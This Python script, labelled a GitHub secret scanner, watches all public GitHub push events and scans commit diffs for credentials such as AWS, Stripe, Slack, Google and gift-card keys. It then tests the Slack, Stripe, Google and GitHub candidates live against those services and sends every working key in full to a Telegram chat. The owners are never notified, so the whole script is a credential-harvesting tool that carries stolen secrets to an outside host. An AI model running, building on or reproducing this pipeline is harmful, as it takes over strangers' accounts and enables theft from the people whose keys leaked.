#!/usr/bin/env python3
"""GitHub Secret Scanner – GitHub Actions (stateless, single run)"""
import asyncio
import aiohttp
import logging
import re
import math
import sys
import json
import time
import os
from datetime import datetime, timezone, timedelta
import requests
from collections import Counter

# --- Config ---
VERIFY_CONCURRENCY = 10
LOG_FILE = "live_keys.log"
ENTROPY_THRESHOLD = 3.5
MIN_ENTROPY_STRING_LENGTH = 16
MAX_ENTROPY_STRING_LENGTH = 128
LAST_TIMESTAMP_FILE = "last_timestamp.txt"

# --- Telegram ---
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

def send_telegram(msg):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=10)
    except Exception:
        pass

# --- Patterns ---
PATTERNS = [
    (r'(?:A3T[A-Z0-9]|AKIA|ASIA)[A-Z0-9]{16}', 'AWS Access Key', None),
    (r'(?i)aws(.{0,20})?(?-i)["\']([0-9a-zA-Z\/+]{40})["\']', 'AWS Secret Key', None),
    (r'(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,}', 'GitHub Token', 'verify_github'),
    (r'xox[baprs]-[a-zA-Z0-9-]+', 'Slack Token', 'verify_slack'),
    (r'sk_live_[0-9a-zA-Z]{24,}', 'Stripe Live Key', 'verify_stripe'),
    (r'AIza[0-9A-Za-z\-_]{35}', 'Google API Key', 'verify_google'),
    (r'-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----', 'Private Key', None),
    (r'(?i)(giftcard|reward|loyalty)(_key|_token|secret)\s*[:=]\s*["\']([a-zA-Z0-9_\-]{32,64})["\']', 'Gift Card Key', None),
]

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s', stream=sys.stdout)
logger = logging.getLogger(__name__)

def shannon_entropy(data: str) -> float:
    if not data:
        return 0.0
    n = len(data)
    counts = Counter(data)
    entropy = 0.0
    for count in counts.values():
        p_x = count / n
        if p_x > 0:
            entropy -= p_x * math.log2(p_x)
    return entropy

def extract_strings_from_diff(diff_text):
    candidates = []
    token_pattern = re.compile(
        rf'["\']([^"\']{{{MIN_ENTROPY_STRING_LENGTH},}})["\']|\b([A-Za-z0-9_\-+/=]{{{MIN_ENTROPY_STRING_LENGTH},}})\b'
    )
    for line in diff_text.split('\n'):
        if line.startswith('+') and not line.startswith('+++'):
            content = line[1:].strip()
            for t in token_pattern.findall(content):
                token = t[0] if t[0] else t[1]
                if len(token) >= MIN_ENTROPY_STRING_LENGTH:
                    candidates.append(token)
    return candidates

def scan_diff(diff_text):
    findings = []
    compiled_patterns = [(re.compile(pattern, re.IGNORECASE | re.MULTILINE), service, verifier)
                         for pattern, service, verifier in PATTERNS]
    for pattern, service, verifier in compiled_patterns:
        for match in pattern.findall(diff_text):
            token = next((m for m in match if isinstance(m, str) and len(m) > 10), None) if isinstance(match, tuple) else match
            if token:
                findings.append({'token': token, 'service': service, 'verifier': verifier})
    seen_tokens = {f['token'] for f in findings}
    for token in extract_strings_from_diff(diff_text):
        if token in seen_tokens or len(token) > MAX_ENTROPY_STRING_LENGTH:
            continue
        if shannon_entropy(token) >= ENTROPY_THRESHOLD:
            findings.append({'token': token, 'service': 'High Entropy String', 'verifier': None})
    return findings

class GitHub:
    def __init__(self, token):
        self.token = token
        self.session = None

    async def _init_session(self):
        if not self.session or self.session.closed:
            self.session = aiohttp.ClientSession(
                headers={'Authorization': f'token {self.token}', 'Accept': 'application/vnd.github.v3+json'},
                timeout=aiohttp.ClientTimeout(total=30)
            )

    async def fetch_events_since(self, since_iso):
        """Fetches ALL push events since the given timestamp (paginated)."""
        await self._init_session()
        url = 'https://api.github.com/events'
        params = {'per_page': 100, 'since': since_iso}
        all_push_events = []
        page = 1
        while True:
            for attempt in range(3):
                try:
                    async with self.session.get(url, params=params) as resp:
                        if resp.status == 403 and resp.headers.get('X-RateLimit-Remaining') == '0':
                            reset_time = int(resp.headers.get('X-RateLimit-Reset', time.time() + 60))
                            await asyncio.sleep(max(reset_time - time.time(), 1))
                            continue
                        if resp.status != 200:
                            logger.error(f"Events API error: {resp.status}")
                            return all_push_events
                        events = await resp.json()
                        push_events = [e for e in events if e.get('type') == 'PushEvent']
                        all_push_events.extend(push_events)
                        logger.debug(f"Page {page}: got {len(events)} events ({len(push_events)} pushes)")
                        # Pagination: check Link header for next page
                        link_header = resp.headers.get('Link')
                        if not link_header or 'rel="next"' not in link_header:
                            return all_push_events
                        # Extract next page URL
                        for part in link_header.split(','):
                            if 'rel="next"' in part:
                                next_url = part.split(';')[0].strip().strip('<>')
                                url = next_url
                                params = None  # next URL already contains params
                                break
                        else:
                            return all_push_events
                        page += 1
                        break  # success, move to next page
                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                    logger.warning(f"Page fetch attempt {attempt+1} failed: {e}")
                    if attempt == 2:
                        return all_push_events
                    await asyncio.sleep(1.5 * (attempt + 1))
        return all_push_events

    async def get_diff(self, repo, sha):
        await self._init_session()
        url = f'https://api.github.com/repos/{repo}/commits/{sha}'
        headers = {'Accept': 'application/vnd.github.v3.diff'}
        try:
            async with self.session.get(url, headers=headers) as resp:
                if resp.status == 200:
                    return await resp.text()
                else:
                    logger.warning(f"Diff {repo}@{sha[:7]}: {resp.status}")
        except Exception as e:
            logger.warning(f"Diff error {repo}@{sha[:7]}: {e}")
        return None

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()

async def verifier_class(session=None):
    semaphore = asyncio.Semaphore(VERIFY_CONCURRENCY)
    client_session = session if session else aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10))

    async def gh_verify(token):
        async with semaphore:
            try:
                async with client_session.get('https://api.github.com/user', headers={'Authorization': f'token {token}'}) as resp:
                    return resp.status == 200
            except Exception:
                return False

    async def slack_verify(token):
        async with semaphore:
            try:
                async with client_session.post('https://slack.com/api/auth.test', headers={'Authorization': f'Bearer {token}'}) as resp:
                    return (await resp.json()).get('ok', False) if resp.status == 200 else False
            except Exception:
                return False

    async def stripe_verify(key):
        async with semaphore:
            try:
                async with client_session.get('https://api.stripe.com/v1/balance', headers={'Authorization': f'Bearer {key}'}) as resp:
                    return resp.status == 200
            except Exception:
                return False

    async def google_verify(key):
        async with semaphore:
            try:
                async with client_session.get('https://www.googleapis.com/oauth2/v1/tokeninfo', params={'access_token': key}) as resp:
                    return resp.status == 200
            except Exception:
                return False

    return gh_verify, slack_verify, stripe_verify, google_verify, client_session

async def get_last_timestamp():
    try:
        with open(LAST_TIMESTAMP_FILE, 'r') as f:
            ts = f.read().strip()
            datetime.fromisoformat(ts.replace('Z', '+00:00'))
            return ts
    except (FileNotFoundError, ValueError):
        return (datetime.now(timezone.utc) - timedelta(hours=1)).strftime('%Y-%m-%dT%H:%M:%SZ')

def update_last_timestamp(ts_str=None):
    ts = ts_str or datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')
    with open(LAST_TIMESTAMP_FILE, 'w') as f:
        f.write(ts)

async def main():
    start_time = time.time()
    logger.info("Starting GitHub Secret Scanner run...")

    github_token = os.environ.get("GITHUB_TOKEN")
    if not github_token:
        logger.error("GITHUB_TOKEN environment variable is not set. Exiting.")
        sys.exit(1)

    github_client = GitHub(github_token)
    verifier_session = None

    try:
        since_iso = await get_last_timestamp()
        logger.info(f"Fetching events since: {since_iso}")

        events = await github_client.fetch_events_since(since_iso)

        if not events:
            logger.info("No new events found.")
            update_last_timestamp()
            return

        logger.info(f"Fetched {len(events)} PushEvents (total across all pages).")

        v_gh, v_slack, v_stripe, v_google, verifier_session = await verifier_class(github_client.session)

        for ev in events:
            repo_name = ev.get('repo', {}).get('name')
            commits = ev.get('payload', {}).get('commits', [])

            if not commits:
                continue  # skip tag pushes etc.

            logger.info(f"Event: {repo_name} - {len(commits)} commits")

            for commit in commits:
                commit_sha = commit.get('sha')
                if not commit_sha:
                    continue

                diff_text = await github_client.get_diff(repo_name, commit_sha)
                if not diff_text:
                    logger.warning(f"Skipping {repo_name}@{commit_sha[:7]} - no diff")
                    continue

                logger.info(f"Scanning {repo_name}@{commit_sha[:7]} ({len(diff_text)} bytes)")

                findings = scan_diff(diff_text)
                if not findings:
                    continue

                logger.info(f"Found {len(findings)} candidate(s) in {repo_name}@{commit_sha[:7]}")

                for f in findings:
                    token_value = f['token']
                    service_name = f['service']
                    verifier_func_name = f['verifier']

                    valid = None
                    if verifier_func_name == 'verify_github':
                        valid = await v_gh(token_value)
                    elif verifier_func_name == 'verify_slack':
                        valid = await v_slack(token_value)
                    elif verifier_func_name == 'verify_stripe':
                        valid = await v_stripe(token_value)
                    elif verifier_func_name == 'verify_google':
                        valid = await v_google(token_value)

                    if valid is True:
                        alert_msg = f"[LIVE KEY] {service_name}: {token_value} (Repo: {repo_name}, Commit: {commit_sha})"
                        logger.warning(alert_msg)
                        try:
                            with open(LOG_FILE, 'a') as lf:
                                lf.write(json.dumps({'timestamp': datetime.now(timezone.utc).isoformat(), 'finding': f, 'repo': repo_name, 'commit': commit_sha}) + '\n')
                        except IOError:
                            pass
                        send_telegram(alert_msg)
                    elif valid is False:
                        logger.info(f"[DEAD] {service_name}: {token_value[:20]}...")
                    else:
                        logger.info(f"[UNKNOWN] {service_name}: {token_value[:20]}...")

        # Update timestamp to the newest event we processed
        if events:
            newest_ts = max(ev['created_at'] for ev in events if 'created_at' in ev)
            update_last_timestamp(newest_ts)
            logger.info(f"Updated timestamp to {newest_ts}")
        else:
            update_last_timestamp()

    finally:
        await github_client.close()
        if verifier_session and verifier_session is not github_client.session and not verifier_session.closed:
            await verifier_session.close()

    logger.info(f"Run finished in {time.time() - start_time:.1f}s")

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Interrupted. Exiting.")
        sys.exit(0)